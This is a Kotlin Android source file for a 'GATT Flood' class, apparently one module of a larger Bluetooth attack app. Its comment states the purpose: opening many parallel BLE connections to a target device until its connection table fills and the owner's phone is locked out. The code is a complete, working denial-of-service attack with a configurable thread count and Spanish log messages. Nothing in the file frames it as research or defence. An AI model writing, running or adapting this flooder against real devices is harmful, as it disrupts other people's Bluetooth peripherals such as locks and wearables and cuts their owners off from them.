package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothManager
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.concurrent.CopyOnWriteArrayList

/**
 * GATT Flood (BLE): opens many parallel LE connections to the target so its
 * connection table fills up and the legitimate phone gets locked out.
 * Most BLE peripherals accept only a handful of concurrent connections.
 */
class GattFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0
) : BluetoothAttack {

    override val displayName = AttackType.GATT_FLOOD.displayName
    override val description = AttackType.GATT_FLOOD.description

    private var scope: CoroutineScope? = null
    private val gattConnections = CopyOnWriteArrayList<BluetoothGatt>()
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        val bm = getSystemService(context, BluetoothManager::class.java)
        val adapter = bm?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }

        val maxConcurrent = threads.coerceIn(4, 64)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope!!.launch {
            var totalOpened = 0
            onLog("[GATT] Flood iniciado (objetivo $targetAddress)")
            onLog("[GATT] Máx conexiones paralelas: $maxConcurrent")
            while (isActive && running) {
                while (running && gattConnections.size < maxConcurrent) {
                    val gatt = try {
                        device.connectGatt(
                            context.applicationContext,
                            false,
                            object : BluetoothGattCallback() {},
                            BluetoothDevice.TRANSPORT_LE
                        )
                    } catch (e: Exception) {
                        null
                    }
                    if (gatt != null) {
                        gattConnections.add(gatt)
                        totalOpened++
                        if (totalOpened % 20 == 0) onLog("[CONN] Conexiones abiertas hasta ahora: $totalOpened")
                    }
                    delay(50)
                }
                if (rateDelayMs > 0) jitterDelay(rateDelayMs) else delay(400)
            }
            onLog("[GATT] Flood detenido ($totalOpened conexiones abiertas en total)")
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        gattConnections.forEach { gatt ->
            runCatching { gatt.disconnect() }
            runCatching { gatt.close() }
        }
        gattConnections.clear()
    }
}
